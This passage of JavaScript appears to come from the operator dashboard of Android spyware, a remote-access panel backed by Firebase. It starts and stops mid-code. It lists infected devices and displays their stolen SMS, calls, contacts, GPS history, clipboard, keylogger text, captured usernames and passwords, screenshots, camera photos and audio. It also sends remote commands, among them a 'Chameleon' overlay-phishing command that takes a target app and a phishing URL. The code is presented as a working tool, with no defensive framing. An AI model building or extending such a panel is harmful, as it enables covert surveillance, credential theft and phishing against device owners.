                        mapDiv.innerHTML = `<p class="text-muted p-3">${messageToDisplay.replace("its data", "location on map.")}</p>`;
                         mapDiv.classList.remove('loading-map');
                    }
                    if (map) {
                        map.eachLayer(layer => { if (!!layer.toGeoJSON) map.removeLayer(layer); });
                        map.setView([0,0], 2);
                    }
                    const historyContainer = document.getElementById('gps-history-data');
                    if(historyContainer) historyContainer.innerHTML = messageToDisplay.replace("its data", "location history.");
                }
            });
            currentDeviceDataCache = {};
        };
        onAuthStateChanged(auth, (user) => {
            showLoading(false);
            if (user) {
                currentUser = user;
                adminEmailEl.innerHTML = `<i class="fas fa-user-shield me-1"></i> ${sanitizeHTML(user.email || 'Admin')}`;
                loginContainer.style.display = 'none';
                dashboardContainer.style.display = 'flex';
                
                loadDeviceList(); 
                clearDashboardData(true);

            } else { 
                currentUser = null;
                loginContainer.style.display = 'flex';
                dashboardContainer.style.display = 'none';
                
                if(currentDeviceUid) detachAllListeners();
                
                currentDeviceUid = null; 

                adminEmailEl.innerHTML = '';
                deviceSelector.innerHTML = '<option value="">-- Select Device --</option>';
                deviceSelector.value = "";

                clearDashboardData(true); 
            }
        });
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            showLoading();
            loginError.style.display = 'none';
            const email = loginForm.email.value;
            const password = loginForm.password.value;
            try {
                await signInWithEmailAndPassword(auth, email, password);
            } catch (error) {
                console.error("Login error:", error.code, error.message);
                let errorMessage = "Login failed. Please check your credentials and try again.";
                switch (error.code) {
                    case 'auth/user-not-found':
                    case 'auth/invalid-credential': 
                        errorMessage = "Incorrect email or password. Please try again.";
                        break;
                    case 'auth/wrong-password': 
                        errorMessage = "Incorrect password. Please try again.";
                        break;
                    case 'auth/invalid-email':
                        errorMessage = "The email address format is not valid.";
                        break;
                    case 'auth/too-many-requests':
                        errorMessage = "Access to this account has been temporarily disabled due to many failed login attempts. You can immediately restore it by resetting your password or you can try again later.";
                        break;
                    case 'auth/network-request-failed':
                        errorMessage = "Network error. Please check your internet connection.";
                        break;
                }
                loginError.textContent = errorMessage;
                loginError.style.display = 'block';
            } finally {
                showLoading(false);
            }
        });
        logoutButton.addEventListener('click', async () => {
            showLoading();
            try {
                await firebaseSignOut(auth);
            } catch (error) {
                console.error("Logout error:", error);
            } finally {
                showLoading(false);
            }
        });
        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                sidebarLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                
                const targetTabId = link.getAttribute('data-tab');
                tabPanes.forEach(pane => {
                    pane.classList.remove('active');
                    if (pane.id === targetTabId) {
                        pane.classList.add('active');
                    }
                });

                if (currentDeviceUid) { 
                    loadDataForActiveTab(); 
                } else { 
                    const targetPane = document.getElementById(targetTabId);
                    if (targetPane) {
                        const dataContainer = targetPane.querySelector('div[id$="-data"], div[id$="-grid"], div[id$="-map"]');
                        const promptMsg = '<p class="text-muted">Please select a device from the dropdown above to view its data.</p>';
                        if (dataContainer) dataContainer.innerHTML = promptMsg;
                        
                        if (targetTabId === 'gps-content') { 
                            const mapDiv = document.getElementById('gps-map');
                            if(mapDiv) mapDiv.innerHTML = `<p class="text-muted p-3">Please select a device to view location on map.</p>`;
                            const historyContainer = document.getElementById('gps-history-data');
                            if(historyContainer) historyContainer.innerHTML = `<p class="text-muted">Location history will appear here once a device is selected.</p>`;
                            if (map) map.setView([0,0],2); 
                        }
                    }
                }
                if (window.innerWidth < 992 && sidebar.classList.contains('active')) { 
                    sidebar.classList.remove('active');
                }
            });
        });
        sidebarToggler.addEventListener('click', () => {
            sidebar.classList.toggle('active');
        });
        const loadDeviceList = () => {
            const devicesRef = ref(db, 'devices');
            if (activeListeners['deviceList'] && typeof activeListeners['deviceList'] === 'function') {
                activeListeners['deviceList'](); 
            }

            const deviceListListener = onValue(devicesRef, (snapshot) => {
                const devices = snapshot.val();
                
                deviceSelector.innerHTML = '<option value="">-- Select Device --</option>';
                let currentDeviceFromStateStillExists = false; 

                if (devices) {
                    Object.keys(devices).forEach(uid => {
                        const alias = devices[uid]?.info?.alias || devices[uid]?.status?.alias || uid;
                        const option = document.createElement('option');
                        option.value = uid;
                        option.textContent = sanitizeHTML(alias);
                        deviceSelector.appendChild(option);

                        if (uid === currentDeviceUid) { 
                            currentDeviceFromStateStillExists = true;
                        }
                    });
                }

                if (currentDeviceUid && currentDeviceFromStateStillExists) {
                    deviceSelector.value = currentDeviceUid;
                } else if (currentDeviceUid && !currentDeviceFromStateStillExists) {
                    console.warn(`Device ${currentDeviceUid} no longer exists. Clearing selection state.`);
                    currentDeviceUid = null; 
                    deviceSelector.value = ""; 
                    clearDashboardData(true); 
                } else {
                    deviceSelector.value = ""; 
                    if (!devices) { 
                        clearDashboardData(true);
                    }
                }

            }, (error) => {
                console.error("Error loading device list:", error);
                deviceSelector.innerHTML = '<option value="">Error loading devices</option>';
                clearDashboardData(true); 
            });
            activeListeners['deviceList'] = deviceListListener;
        };
        deviceSelector.addEventListener('change', (e) => {
            selectDevice(e.target.value); 
        });
        function selectDevice(uid) {
            Object.keys(activeListeners).forEach(key => {
                if (key !== 'deviceList' && typeof activeListeners[key] === 'function') {
                    activeListeners[key]();
                    delete activeListeners[key];
                }
            });
            
            currentDeviceUid = uid; 

            if (uid) { 
                loadDataForActiveTab(); 
            } else { 
                clearDashboardData(true); 
            }
        }
        async function updateDeviceAliasInSelector(uidToUpdate) { 
            if (!uidToUpdate) return;
            try {
                const aliasSnapshot = await get(child(ref(db, 'devices'), `${uidToUpdate}/info/alias`));
                if (aliasSnapshot.exists()) {
                    const alias = aliasSnapshot.val();
                    const option = deviceSelector.querySelector(`option[value="${uidToUpdate}"]`);
                    if (option && option.textContent !== alias) { 
                         option.textContent = sanitizeHTML(alias);
                    }
                }
            } catch (error) {
                console.error("Error fetching alias for selector update:", error);
            }
        }
        const detachAllListeners = () => { 
            Object.values(activeListeners).forEach(detachFn => {
                if (typeof detachFn === 'function') {
                    detachFn();
                }
            });
            activeListeners = {};
        };
        const listenToDbPath = (path, callback, sectionName) => {
            if (activeListeners[sectionName] && typeof activeListeners[sectionName] === 'function') {
                activeListeners[sectionName](); 
            }
            const dataRef = ref(db, path);
            const listener = onValue(dataRef, (snapshot) => {
                if ((currentDeviceUid && path.includes(currentDeviceUid)) || sectionName === 'deviceList' || !path.startsWith('devices/')) {
                    callback(snapshot.val());
                }
            }, (error) => {
                console.error(`Error fetching ${sectionName}:`, error);
                const containerId = `${sectionName.replace('Part', '')}-data`; 
                const container = document.getElementById(containerId) || 
                                  document.getElementById(`${sectionName}-content`)?.querySelector('div[id$="-data"], div[id$="-grid"]') ||
                                  (sectionName === 'gps' ? document.getElementById('gps-map') : null);

                if (container) {
                     container.innerHTML = `<p class="text-danger">Error loading ${sectionName.replace('-', ' ')} data.</p>`;
                     if (sectionName === 'gps') { 
                        const historyContainer = document.getElementById('gps-history-data');
                        if (historyContainer) historyContainer.innerHTML = ''; 
                     }
                }
            });
            activeListeners[sectionName] = listener; 
        };
        const loadDataForActiveTab = () => {
            if (!currentDeviceUid) { 
                clearDashboardData(true); 
                return;
            }
            const activeTabLink = document.querySelector('#sidebar .nav-link.active');
            if (!activeTabLink) return;

            const tabId = activeTabLink.getAttribute('data-tab'); 
            
            document.querySelectorAll('.tab-pane .spinner-border').forEach(s => s.remove()); 
            const targetPane = document.getElementById(tabId);
            if (targetPane) {
                 const dataContainer = targetPane.querySelector('div[id$="-data"], div[id$="-grid"], div[id$="-map"]');
                 if (dataContainer && !dataContainer.querySelector('.spinner-border')) { 
                    if (tabId === 'gps-content') { 
                        const mapDiv = document.getElementById('gps-map');
                        const historyDiv = document.getElementById('gps-history-data');
                        if (mapDiv) { 
                             mapDiv.innerHTML = '<div class="d-flex justify-content-center align-items-center h-100"><div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading map...</span></div></div>';
                             mapDiv.classList.add('loading-map'); 
                        }
                        if (historyDiv && !historyDiv.querySelector('.spinner-border')) historyDiv.innerHTML = '<div class="d-flex justify-content-center mt-1"><div class="spinner-border spinner-border-sm text-primary" role="status"></div></div>';
                    } else if (dataContainer){ 
                        dataContainer.innerHTML = '<div class="d-flex justify-content-center mt-3"><div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div></div>';
                    }
                 }
            }

            switch (tabId) {
                case 'overview-content': loadOverviewData(); break;
                case 'messages-content': loadSmsData(); break;
                case 'calls-content': loadCallLogsData(); break;
                case 'apps-content': loadAppsData(); break;
                case 'battery-content': loadBatteryData(); break;
                case 'gps-content': loadGpsData(); break;
                case 'files-content': loadFilesData(); break;
                case 'screenshots-content': loadScreenshotsData(); break;
                case 'notifications-content': loadNotificationsData(); break;
                case 'device-info-content': loadDeviceInfoData(); break;
                case 'contacts-content': loadContactsData(); break;
                case 'clipboard-content': loadClipboardData(); break;
                case 'keylogger-content': loadKeyloggerData(); break;
                case 'credentials-content': loadCredentialsData(); break;
                case 'camera-photos-content': loadCameraPhotosData(); break;
                case 'audio-content': loadAudioData(); break;
                case 'app-usage-content': loadAppUsageData(); break;
                case 'network-info-content': loadNetworkInfoData(); break;
                case 'event-logs-content': loadEventLogsData(); break;
                case 'commands-content': loadCommandsData(); break;
            }
        };

        const loadOverviewData = () => {
            if (!currentDeviceUid) return;
            const infoPath = `devices/${currentDeviceUid}/info`;
            const statusPath = `devices/${currentDeviceUid}/status`;
            listenToDbPath(infoPath, (infoData) => {
                listenToDbPath(statusPath, (statusData) => {
                    const data = { ...(infoData || {}), ...(statusData || {}) };
                    const container = document.getElementById('overview-data');
                    currentDeviceDataCache.overview = []; 
                    if (Object.keys(data).length === 0) { 
                        container.innerHTML = '<p class="text-muted">No overview data found for this device. It might be a new device or data is yet to sync.</p>';
                        return;
                    }
                    const alias = data.alias || currentDeviceUid;
                    const lastSeen = data.lastSeen || data.heartbeat || infoData?.lastSeen;
                    const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
                    const isOnline = lastSeen && lastSeen > fiveMinutesAgo;
                    const overviewItems = [
                        { label: "Device UID", value: currentDeviceUid },
                        { label: "Alias", value: alias, editable: true },
                        { label: "Status", value: `<span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span> ${isOnline ? 'Online' : 'Offline'}` },
                        { label: "Last Seen", value: formatTimestamp(lastSeen) },
                        { label: "Battery", value: data.battery ? `${data.battery}%` : 'N/A' },
                        { label: "Is Charging", value: data.isCharging === true ? 'Yes' : (data.isCharging === false ? 'No' : 'N/A') },
                        { label: "VPN Status", value: data.vpnConnected ? 'Connected' : 'Not Connected' }
                    ];
                    let html = '<div class="list-group">';
                    const exportData = {};
                    overviewItems.forEach(item => {
                        html += `<div class="list-group-item">
                                    <div class="row align-items-center">
                                        <div class="col-sm-3"><strong>${item.label}:</strong></div>
                                        <div class="col-sm-9">`;
                        if (item.editable) {
                            html += `<div class="editable-alias input-group input-group-sm">
                                        <input type="text" class="form-control form-control-sm" id="editable-alias-input" value="${sanitizeHTML(String(item.value))}">
                                        <button class="btn btn-outline-success btn-sm" id="save-alias-btn"><i class="fas fa-save"></i></button>
                                     </div>`;
                        } else {
                            html += item.value; 
                        }
                        html += `   </div></div></div>`;
                        exportData[item.label] = (typeof item.value === 'string' && item.value.includes('<span')) ? (isOnline ? 'Online' : 'Offline') : item.value;
                    });
                    html += '</div>';
                    container.innerHTML = html;
                    currentDeviceDataCache.overview = [exportData]; 
                    if (document.getElementById('save-alias-btn')) {
                        document.getElementById('save-alias-btn').addEventListener('click', async () => {
                            const newAlias = document.getElementById('editable-alias-input').value;
                            if (newAlias.trim() === "") { alert("Alias cannot be empty."); return; }
                            showLoading();
                            try {
                                await update(ref(db, `devices/${currentDeviceUid}/info`), { alias: newAlias });
                                await update(ref(db, `devices/${currentDeviceUid}/status`), { alias: newAlias });
                                alert('Alias updated successfully!');
                                updateDeviceAliasInSelector(currentDeviceUid);
                            } catch (error) {
                                console.error("Error updating alias:", error);
                                alert('Failed to update alias.');
                            } finally {
                                showLoading(false);
                            }
                        });
                    }
                }, 'overviewStatusPart');
            }, 'overviewInfoPart');
        };
        const loadSmsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/sms`;
            listenToDbPath(path, (data) => {
                const smsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.sms = smsArray; 
                const headers = [
                    { key: 'address', label: 'Address/Number' }, { key: 'name', label: 'Contact Name' },
                    { key: 'body', label: 'Message Body', wrap: true },
                    { key: 'date', label: 'Date', formatter: formatTimestamp },
                    { key: 'type', label: 'Type', formatter: (type) => type === 1 || type === 'inbox' ? 'Inbox' : (type === 2 || type === 'sent' ? 'Sent' : 'Unknown') }
                ];
                document.getElementById('messages-data').innerHTML = createTable(smsArray.sort((a,b) => b.date - a.date), headers, 'messages'); 
            }, 'messages');
        };
        const loadCallLogsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/calls`;
            listenToDbPath(path, (data) => {
                const callsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.calls = callsArray;
                const headers = [
                    { key: 'number', label: 'Number' }, { key: 'name', label: 'Contact Name' },
                    { key: 'duration', label: 'Duration', formatter: formatDuration }, { key: 'date', label: 'Date', formatter: formatTimestamp },
                    { key: 'type', label: 'Type', formatter: (type) => {
                        const types = {1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked'};
                        return types[type] || 'Unknown';
                    }}
                ];
                document.getElementById('calls-data').innerHTML = createTable(callsArray.sort((a,b) => b.date - a.date), headers, 'call logs');
            }, 'calls');
        };
        const loadAppsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/installed_apps`;
            listenToDbPath(path, (data) => {
                const appsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.apps = appsArray;
                const headers = [
                    { key: 'appName', label: 'App Name' }, { key: 'packageName', label: 'Package Name', wrap: true },
                    { key: 'versionName', label: 'Version' }, { key: 'firstInstallTime', label: 'Installed', formatter: formatTimestamp },
                    { key: 'lastUpdateTime', label: 'Updated', formatter: formatTimestamp }
                ];
                document.getElementById('apps-data').innerHTML = createTable(appsArray.sort((a,b) => b.firstInstallTime - a.firstInstallTime), headers, 'installed apps');
            }, 'apps');
        };
        const loadBatteryData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/status`;
            listenToDbPath(path, (data) => {
                const batteryData = data ? { 
                    battery: data.battery, 
                    isCharging: data.isCharging,
                    lastSeen: formatTimestamp(data.lastSeen)
                } : {};
                displayKeyValuePairs(batteryData, 'battery-data', 'battery info');
            }, 'battery');
        };
        const loadGpsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/location`;
            const mapContainer = document.getElementById('gps-map');
            const historyContainer = document.getElementById('gps-history-data');
            mapContainer.classList.remove('loading-map'); 

            if (!map && L) {
                map = L.map(mapContainer).setView([0, 0], 2); 
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(map);
            } else if (map) { 
                 map.eachLayer(layer => { if (!!layer.toGeoJSON) map.removeLayer(layer); });
            }

            listenToDbPath(path, (data) => {
                const gpsArray = data ? Object.values(data).sort((a,b) => b.timestamp - a.timestamp) : []; 
                currentDeviceDataCache.gps = gpsArray;
                mapContainer.classList.remove('loading-map'); 

                if (gpsArray.length > 0 && map) {
                    const latest = gpsArray[0];
                    if (latest.lat && latest.lon) {
                        if (mapContainer.querySelector('p.text-muted')) mapContainer.innerHTML = '';
                        if (!document.getElementById('gps-map')._leaflet_id) { 
                            map = L.map(mapContainer).setView([0, 0], 2);
                             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
                        }
                        const latLng = [latest.lat, latest.lon];
                        map.setView(latLng, 15);
                        L.marker(latLng).addTo(map)
                            .bindPopup(`<b>Location</b><br>Lat: ${latest.lat}<br>Lon: ${latest.lon}<br>Time: ${formatTimestamp(latest.timestamp)}<br>Accuracy: ${latest.accuracy || 'N/A'}m`)
                            .openPopup();
                    } else { 
                         mapContainer.innerHTML = '<p class="text-muted p-3">Latest GPS data is incomplete or invalid.</p>';
                         if(map) map.setView([0,0],2); 
                    }
                } else if (currentDeviceUid && map) { 
                     mapContainer.innerHTML = '<p class="text-muted p-3">No GPS data found for this device.</p>';
                     map.setView([0, 0], 2); 
                } else if (!currentDeviceUid && map) { 
                     mapContainer.innerHTML = '<p class="text-muted p-3">Please select a device to view location on map.</p>';
                     map.setView([0, 0], 2);
                }
                
                const headers = [
                    { key: 'lat', label: 'Latitude' }, { key: 'lon', label: 'Longitude' },
                    { key: 'accuracy', label: 'Accuracy (m)' },
                    { key: 'provider', label: 'Provider' },
                    { key: 'timestamp', label: 'Timestamp', formatter: formatTimestamp }
                ];
                historyContainer.innerHTML = createTable(gpsArray, headers, 'GPS history');
            }, 'gps');
        };
        const loadFilesData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/file_list`;
            listenToDbPath(path, (data) => {
                const filesArray = data ? Object.values(data) : [];
                currentDeviceDataCache.files = filesArray;
                const headers = [
                    { key: 'path', label: 'Path', wrap: true }, { key: 'name', label: 'Name' },
                    { key: 'size', label: 'Size (Bytes)' }, { key: 'lastModified', label: 'Last Modified', formatter: formatTimestamp }
                ];
                document.getElementById('files-data').innerHTML = createTable(filesArray.sort((a,b) => b.lastModified - a.lastModified), headers, 'file logs');
            }, 'files');
        };
        const loadScreenshotsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/screenshots`;
            listenToDbPath(path, (data) => {
                const screenshotsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.screenshots = screenshotsArray; 
                const container = document.getElementById('screenshots-data');
                
                if (!currentDeviceUid) { 
                     container.innerHTML = '<p class="text-muted">Please select a device to view screenshots.</p>'; return;
                }
                if (screenshotsArray.length === 0) {
                    container.innerHTML = '<p class="text-muted">No screenshots found for this device.</p>';
                    return;
                }
                let html = '';
                screenshotsArray.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

                screenshotsArray.forEach(ss => {
                    if (ss.url) { 
                        html += `<div class="screenshot-item">
                                    <a href="${sanitizeHTML(ss.url)}" target="_blank" title="View full size. Captured: ${formatTimestamp(ss.timestamp)}">
                                        <img src="${sanitizeHTML(ss.url)}" alt="Screenshot" loading="lazy">
                                    </a>
                                    <p class="small text-muted text-center">${formatTimestamp(ss.timestamp)}</p>
                                 </div>`;
                    }
                });
                container.innerHTML = html || '<p class="text-muted">No valid screenshot URLs found for this device.</p>'; 
            }, 'screenshots');
        };
        const loadNotificationsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/notifications`;
            listenToDbPath(path, (data) => {
                const notificationsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.notifications = notificationsArray;
                const headers = [
                    { key: 'appName', label: 'App Name' }, { key: 'title', label: 'Title', wrap: true },
                    { key: 'text', label: 'Text', wrap: true }, { key: 'postTime', label: 'Post Time', formatter: formatTimestamp }
                ];
                document.getElementById('notifications-data').innerHTML = createTable(notificationsArray.sort((a,b) => b.postTime - a.postTime), headers, 'notifications');
            }, 'notifications');
        };
        const loadDeviceInfoData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/info`; 
            listenToDbPath(path, (data) => {
                displayKeyValuePairs(data, 'device-info-data', 'device info');
            }, 'deviceInfo'); 
        };
        const loadContactsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/contacts`;
            listenToDbPath(path, (data) => {
                const contactsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.contacts = contactsArray;
                const headers = [
                    { key: 'name', label: 'Name' },
                    { key: 'phoneNumbers', label: 'Phone Numbers', wrap: true, formatter: (numbers) => Array.isArray(numbers) ? numbers.join(', ') : numbers }
                ];
                document.getElementById('contacts-data').innerHTML = createTable(contactsArray, headers, 'contacts');
            }, 'contacts');
        };
        const loadClipboardData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/clipboard`;
            listenToDbPath(path, (data) => {
                const clipboardArray = data ? Object.values(data) : [];
                currentDeviceDataCache.clipboard = clipboardArray;
                const headers = [
                    { key: 'text', label: 'Copied Text', wrap: true },
                    { key: 'timestamp', label: 'Time', formatter: formatTimestamp }
                ];
                document.getElementById('clipboard-data').innerHTML = createTable(clipboardArray.sort((a,b) => b.timestamp - a.timestamp), headers, 'clipboard logs');
            }, 'clipboard');
        };
        const loadKeyloggerData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/keylogger`;
            listenToDbPath(path, (data) => {
                const keyloggerArray = data ? Object.values(data) : [];
                currentDeviceDataCache.keylogger = keyloggerArray;
                const headers = [
                    { key: 'appName', label: 'Application' },
                    { key: 'text', label: 'Typed Text', wrap: true },
                    { key: 'timestamp', label: 'Time', formatter: formatTimestamp }
                ];
                document.getElementById('keylogger-data').innerHTML = createTable(keyloggerArray.sort((a,b) => b.timestamp - a.timestamp), headers, 'keylogger data');
            }, 'keylogger');
        };
        const loadCredentialsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/credentials`;
            listenToDbPath(path, (data) => {
                const credsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.credentials = credsArray;
                const headers = [
                    { key: 'target_app', label: 'Target App', wrap: true },
                    { key: 'username', label: 'Username / Email', wrap: true },
                    { key: 'password', label: 'Password', wrap: true },
                    { key: 'timestamp', label: 'Captured Time', formatter: formatTimestamp }
                ];
                document.getElementById('credentials-data').innerHTML = createTable(credsArray.sort((a,b) => b.timestamp - a.timestamp), headers, 'captured credentials');
            }, 'credentials');
        };
        const loadCameraPhotosData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/camera_photos`;
            listenToDbPath(path, (data) => {
                const photosArray = data ? Object.values(data) : [];
                currentDeviceDataCache.camera_photos = photosArray;
                const container = document.getElementById('camera-photos-data');
                if (!currentDeviceUid) {
                    container.innerHTML = '<p class="text-muted">Please select a device.</p>'; return;
                }
                if (photosArray.length === 0) {
                    container.innerHTML = '<p class="text-muted">No camera photos found for this device.</p>';
                    return;
                }
                let html = '';
                photosArray.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
                photosArray.forEach(photo => {
                    if (photo.url) {
                        html += `<div class="camera-photo-item">
                                    <a href="${sanitizeHTML(photo.url)}" target="_blank" title="View full size. Captured: ${formatTimestamp(photo.timestamp)}">
                                        <img src="${sanitizeHTML(photo.url)}" alt="Camera Photo" loading="lazy">
                                    </a>
                                    <p class="small text-muted text-center">${photo.type || 'Photo'} - ${formatTimestamp(photo.timestamp)}</p>
                                 </div>`;
                    }
                });
                container.innerHTML = html || '<p class="text-muted">No valid photo URLs found.</p>';
            }, 'camera_photos');
        };
        const loadAudioData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/audio`;
            listenToDbPath(path, (data) => {
                const audioArray = data ? Object.values(data) : [];
                currentDeviceDataCache.audio = audioArray;
                const container = document.getElementById('audio-data');
                if (!currentDeviceUid) {
                    container.innerHTML = '<p class="text-muted">Please select a device.</p>'; return;
                }
                if (audioArray.length === 0) {
                    container.innerHTML = '<p class="text-muted">No audio recordings found for this device.</p>';
                    return;
                }
                let html = '';
                audioArray.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
                audioArray.forEach(audio => {
                    if (audio.url) {
                        html += `<div class="audio-item">
                                    <h6>${sanitizeHTML(audio.filename || 'Audio Recording')}</h6>
                                    <p class="small text-muted mb-2">Recorded: ${formatTimestamp(audio.timestamp)}</p>
                                    <a href="${sanitizeHTML(audio.url)}" target="_blank" class="btn btn-primary w-100">
                                        <i class="fas fa-download me-2"></i> Play / Download Audio
                                    </a>
                                 </div>`;
                    }
                });
                container.innerHTML = html || '<p class="text-muted">No valid audio URLs found.</p>';
            }, 'audio');
        };
        const loadAppUsageData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/usage_stats`;
            listenToDbPath(path, (data) => {
                const usageArray = data ? Object.values(data) : [];
                currentDeviceDataCache.usage_stats = usageArray;
                const headers = [
                    { key: 'packageName', label: 'Package Name', wrap: true },
                    { key: 'appName', label: 'App Name' },
                    { key: 'totalTimeInForeground', label: 'Usage Duration', formatter: (ms) => formatDuration(ms / 1000) },
                    { key: 'lastTimeUsed', label: 'Last Used', formatter: formatTimestamp }
                ];
                document.getElementById('app-usage-data').innerHTML = createTable(usageArray.sort((a,b) => b.totalTimeInForeground - a.totalTimeInForeground), headers, 'app usage stats');
            }, 'usage_stats');
        };
        const loadNetworkInfoData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/network`;
            listenToDbPath(path, (data) => {
                 displayKeyValuePairs(data, 'network-info-data', 'network');
                 currentDeviceDataCache.network = data ? [data] : [];
            }, 'network');
        };
        const loadEventLogsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/events`;
            listenToDbPath(path, (data) => {
                const eventsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.events = eventsArray;
                const headers = [
                    { key: 'type', label: 'Event Type' },
                    { key: 'details', label: 'Details', wrap: true },
                    { key: 'timestamp', label: 'Time', formatter: formatTimestamp }
                ];
                document.getElementById('event-logs-data').innerHTML = createTable(eventsArray.sort((a,b) => b.timestamp - a.timestamp), headers, 'event logs');
            }, 'events');
        };
        const loadCommandsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/commands`;
            listenToDbPath(path, (data) => {
                 const resultsArray = data ? Object.values(data) : [];
                 currentDeviceDataCache.commands = resultsArray;
                 const headers = [
                    { key: 'cmd', label: 'Command' }, 
                    { key: 'title', label: 'Title'},
                    { key: 'message', label: 'Message'},
                    { key: 'parameter', label: 'Parameter' },
                    { key: 'status', label: 'Status' },
                    { key: 'result', label: 'Result/Link', wrap: true },
                    { key: 'executedAt', label: 'Executed Time', formatter: formatTimestamp }
                 ];
                 document.getElementById('command-history-data').innerHTML = createTable(resultsArray.sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0)), headers, 'command history');
            }, 'commands');
        };

        const commandSelector = document.getElementById('command-preset-selector');
        const paramContainer = document.getElementById('command-parameter-container');
        const paramInput = document.getElementById('command-parameter-input');
        const alertParamContainer = document.getElementById('alert-parameter-container');
        const alertTitleInput = document.getElementById('alert-title-input');
        const alertMessageInput = document.getElementById('alert-message-input');
        const alertDurationInput = document.getElementById('alert-duration-input');
        const chameleonParamContainer = document.getElementById('chameleon-parameter-container');
        const chameleonTargetInput = document.getElementById('chameleon-target-input');
        const chameleonUrlInput = document.getElementById('chameleon-url-input');

        commandsList.forEach(cmd => {
            const option = document.createElement('option');
            option.value = cmd.value;
            option.textContent = cmd.text;
            option.dataset.commandType = cmd.commandType;
            option.dataset.placeholder = cmd.placeholder || '';
            commandSelector.appendChild(option);
        });

        commandSelector.addEventListener('change', (e) => {
            const selectedOption = e.target.options[e.target.selectedIndex];
            const commandType = selectedOption.dataset.commandType;
            
            paramContainer.style.display = 'none';
            alertParamContainer.style.display = 'none';
            chameleonParamContainer.style.display = 'none';

            if (commandType === 'alert') {
                alertParamContainer.style.display = 'block';
            } else if (commandType === 'parameterized') {
                paramInput.value = '';
                paramInput.placeholder = selectedOption.dataset.placeholder;
                paramContainer.style.display = 'block';
            } 
            else if (commandType === 'chameleon') {
                chameleonParamContainer.style.display = 'block';
            }
        });

        document.getElementById('send-command-btn')?.addEventListener('click', async () => {
            const commandValue = commandSelector.value;
            const statusEl = document.getElementById('command-status');
            const selectedOption = commandSelector.options[commandSelector.selectedIndex];
            const commandType = selectedOption.dataset.commandType;
            
            statusEl.innerHTML = '';

            if (!currentDeviceUid) {
                statusEl.innerHTML = `<div class="alert alert-danger alert-sm p-2">Please select a device first.</div>`;
                return;
            }
            if (!commandValue || commandType === 'none') {
                statusEl.innerHTML = `<div class="alert alert-warning alert-sm p-2">Please select a command to send.</div>`;
                return;
            }

            let commandToSend = {
                cmd: commandValue,
                status: "pending",
                timestamp: Date.now()
            };

            if (commandType === 'chameleon') {
                const targetPackage = chameleonTargetInput.value.trim();
                const phishingUrl = chameleonUrlInput.value.trim();

                if (!targetPackage || !phishingUrl) {
                    statusEl.innerHTML = `<div class="alert alert-warning alert-sm p-2">Target Package and Phishing URL are required for Chameleon.</div>`;
                    return;
                }
                commandToSend.target_package = targetPackage;
                commandToSend.phishing_url = phishingUrl;
            }
            else if (commandType === 'alert') {
                const title = alertTitleInput.value.trim();
                const message = alertMessageInput.value.trim();
                const duration = parseInt(alertDurationInput.value, 10) || 15;

                if (!message) {
                    statusEl.innerHTML = `<div class="alert alert-warning alert-sm p-2">Alert message cannot be empty.</div>`;
                    return;
                }
                commandToSend.title = title || "System Alert";
                commandToSend.message = message;
                commandToSend.duration = duration;

            } else if (commandType === 'parameterized') {
                const parameterValue = paramInput.value.trim();
                if (parameterValue === '') {
                    statusEl.innerHTML = `<div class="alert alert-warning alert-sm p-2">This command requires a parameter. Please enter it.</div>`;
                    return;
                }
                commandToSend.parameter = parameterValue;
            }

            statusEl.innerHTML = `<div class="alert alert-info alert-sm p-2">Sending command...</div>`;
            
            try {
                const commandsListRef = ref(db, `devices/${currentDeviceUid}/commands`);
                const newCommandRef = push(commandsListRef);
                await set(newCommandRef, commandToSend);

                statusEl.innerHTML = `<div class="alert alert-success alert-sm p-2">Command sent successfully! Check history below for results.</div>`;
                
                commandSelector.value = "";
